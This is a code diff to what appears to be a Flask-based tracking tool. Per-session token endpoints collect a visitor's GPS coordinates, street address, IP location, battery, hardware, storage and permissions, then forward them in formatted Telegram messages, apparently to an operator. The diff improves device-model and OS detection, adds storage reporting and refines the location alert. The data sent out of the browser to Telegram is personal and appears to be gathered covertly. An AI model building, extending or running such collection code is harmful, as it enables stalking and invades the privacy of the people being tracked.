@@ -4,6 +4,7 @@ import uuid
 import base64
 import json
 import requests
+import re  
 from datetime import datetime
 from dotenv import load_dotenv
 from flask import (
@@ -165,6 +166,30 @@ def reverse_geocode_from_coords(coords: dict):
     except Exception as e:
         print("Reverse geocode failed:", e)
     return None
+def guess_device_model(ua: str):
+    if not ua:
+        return None
+    # crude Android model guess: part after "Android ...;"
+    m = re.search(r"Android [^;]*; ([^;/\)]+)", ua)
+    if m:
+        return m.group(1).strip()
+    return None
+
+
+def guess_os_name(ua: str, platform: str):
+    ua = ua or ""
+    platform = platform or ""
+    if "Android" in ua:
+        return "Android"
+    if "iPhone" in ua or "iPad" in ua or "iOS" in ua:
+        return "iOS"
+    if "Windows NT" in ua:
+        return "Windows"
+    if "Mac OS X" in ua:
+        return "macOS"
+    if "Linux" in ua and "Android" not in ua:
+        return "Linux"
+    return platform or "unknown"
 
 
 # ---------- Basic endpoints ----------
@@ -290,8 +315,7 @@ def upload_info(token):
     if battery is None and coords is None and details is None:
         return jsonify({"status": "ok", "stored": entry})
 
-    # -------- Telegram notification formatting --------
-    # Battery
+    # -------- Battery ----------
     if isinstance(battery, dict):
         lvl = battery.get("level")
         chg = battery.get("charging")
@@ -306,22 +330,22 @@ def upload_info(token):
     else:
         bat_txt = "unknown"
 
-    # Coords
+    # -------- GPS ----------
+    loc_txt = "unknown"
+    acc_m = None
     if isinstance(coords, dict):
         lat = coords.get("lat")
         lon = coords.get("lon")
-        acc = coords.get("acc") or coords.get("accuracy")
+        acc_m = coords.get("acc") or coords.get("accuracy")
         if lat is not None and lon is not None:
-            if acc is not None:
-                loc_txt = f"{lat},{lon} (±{acc} m)"
+            if acc_m is not None:
+                loc_txt = f"{lat},{lon} (±{acc_m} m)"
             else:
                 loc_txt = f"{lat},{lon}"
         else:
             loc_txt = str(coords)
-    else:
-        loc_txt = "unknown"
 
-    # GeoIP
+    # ---------- GeoIP ----------
     city = region = country = isp = "unknown"
     if isinstance(geo, dict):
         city = geo.get("city") or "unknown"
@@ -329,7 +353,7 @@ def upload_info(token):
         country = geo.get("country_name") or geo.get("country") or "unknown"
         isp = geo.get("org") or geo.get("asn") or "unknown"
 
-    # Device details from JS
+    # ---------- Device / HW details ----------
     d = details or {}
     ua = d.get("userAgent", "") or ""
     platform = d.get("platform") or ""
@@ -340,11 +364,11 @@ def upload_info(token):
     net = d.get("network") or {}
     perms = d.get("permissions") or {}
     tz = d.get("tz") or {}
+    storage = d.get("storage") or {}
 
     ua_short = ua[:80] + ("…" if len(ua) > 80 else "")
-    os_browser = platform
-    if ua_short:
-        os_browser = f"{platform} | {ua_short}" if platform else ua_short
+    os_name = guess_os_name(ua, platform)
+    model_guess = guess_device_model(ua)
 
     scr_w = scr.get("w")
     scr_h = scr.get("h")
@@ -364,6 +388,18 @@ def upload_info(token):
     tz_name = tz.get("zone") if isinstance(tz, dict) else None
     tz_off = tz.get("offset") if isinstance(tz, dict) else None
 
+    quota_b = storage.get("quotaBytes")
+    usage_b = storage.get("usageBytes")
+    quota_gb = usage_gb = None
+    try:
+        if quota_b:
+            quota_gb = round(quota_b / 1e9, 1)
+        if usage_b:
+            usage_gb = round(usage_b / 1e9, 1)
+    except Exception:
+        pass
+
+    # ---------- Build Telegram message ----------
     lines = [
         f"📡 Session {token} — INFO",
         f"⏱ Time: {timestamp}",
@@ -378,14 +414,28 @@ def upload_info(token):
     if human_address:
         lines.append(f"🏠 Address: {human_address}")
 
-    device_line = f"📱 Device: {os_browser}" if os_browser else "📱 Device: unknown"
-    lines.append(device_line)
+    # GPS accuracy warning
+    if acc_m is not None and acc_m > 2000:
+        km = round(acc_m / 1000, 1)
+        lines.append(f"⚠️ GPS accuracy very low (~{km} km) — address may be off.")
+
+    main_device = os_name
+    if model_guess:
+        main_device += f" · {model_guess}"
+    if ua_short:
+        main_device += f" | {ua_short}"
+    lines.append(f"📱 Device: {main_device}")
 
     extra_hw = []
     if ram is not None:
         extra_hw.append(f"RAM {ram} GB")
     if cpu is not None:
         extra_hw.append(f"CPU {cpu} cores")
+    if quota_gb is not None:
+        if usage_gb is not None:
+            extra_hw.append(f"Storage {usage_gb}/{quota_gb} GB used")
+        else:
+            extra_hw.append(f"Storage {quota_gb} GB")
     if extra_hw:
         lines.append("💾 " + " · ".join(extra_hw))
 
@@ -430,7 +480,6 @@ def upload_info(token):
     tg_send_text(chat_id, msg)
 
     return jsonify({"status": "ok", "stored": entry})
-
 
 # ---------- upload_image ----------
 @app.route("/upload_image/<token>", methods=["POST"])
